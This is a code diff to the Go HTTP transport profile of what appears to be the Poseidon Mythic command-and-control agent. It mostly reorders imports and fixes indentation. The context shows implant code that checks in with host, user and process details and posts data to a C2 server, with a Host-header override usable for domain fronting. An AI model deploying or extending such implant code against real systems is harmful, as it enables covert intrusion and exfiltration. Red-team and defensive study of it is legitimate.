@@ -1,28 +1,29 @@
+// This file is copied to pkg/profiles/ directory when Poseidon is built using the http profile at https://github.com/MythicC2Profiles/http
+
 package profiles
 
 import (
 	"bytes"
 	"crypto/rsa"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"path/filepath"
-
-	//"log"
-	"crypto/tls"
 	"math"
 	"net/http"
 	"net/url"
 	"os"
+	"path/filepath"
 	"reflect"
 	"strings"
 	"sync"
 	"time"
 
-	"pkg/utils/crypto"
-	"pkg/utils/functions"
-	"pkg/utils/structs"
+	// Poseidon
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
 var Config = structs.Defaultconfig{
@@ -102,9 +103,9 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string, operat
 	c.PostURI = Config.PostURI
 	c.GetURI = Config.GetURI
 	c.QueryPathName = Config.QueryPathName
-    var hl []structs.HeaderStruct
-    json.Unmarshal([]byte(headers), &hl)
-    Config.HeaderList = hl
+	var hl []structs.HeaderStruct
+	json.Unmarshal([]byte(headers), &hl)
+	Config.HeaderList = hl
 	// Add proxy info if set
 	//if len(Config.ProxyURL) > 0 && !strings.Contains(Config.ProxyURL, "proxy_host:proxy_port/") {
 	if len(Config.ProxyURL) > 3{
@@ -135,7 +136,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string, operat
 	} else {
 		c.Key = ""
 	}
-    c.HeaderList = Config.HeaderList
+	c.HeaderList = Config.HeaderList
 
 	c.UUID = UUID
 	c.ApfellID = c.UUID
@@ -308,11 +309,11 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	contentLength := len(sendData)
 	req.ContentLength = int64(contentLength)
 	for _,val := range c.HeaderList {
-	    if val.Key == "Host" {
-	        req.Host = val.Value
-	    }else{
-	        req.Header.Set(val.Key, val.Value)
-	    }
+		if val.Key == "Host" {
+			req.Host = val.Value
+		}else{
+			req.Header.Set(val.Key, val.Value)
+		}
 
 	}
 	// loop here until we can get our data to go through properly
@@ -434,13 +435,13 @@ func (c *C2Default) htmlGetData(requestUrl string, obody []byte) []byte {
 		}
 
 		for _,val := range c.HeaderList {
-            if val.Key == "Host" {
-                req.Host = val.Value
-            }else{
-                req.Header.Set(val.Key, val.Value)
-            }
+			if val.Key == "Host" {
+				req.Host = val.Value
+			}else{
+				req.Header.Set(val.Key, val.Value)
+			}
 
-        }
+		}
 		resp, err := client.Do(req)
 
 		if err != nil {
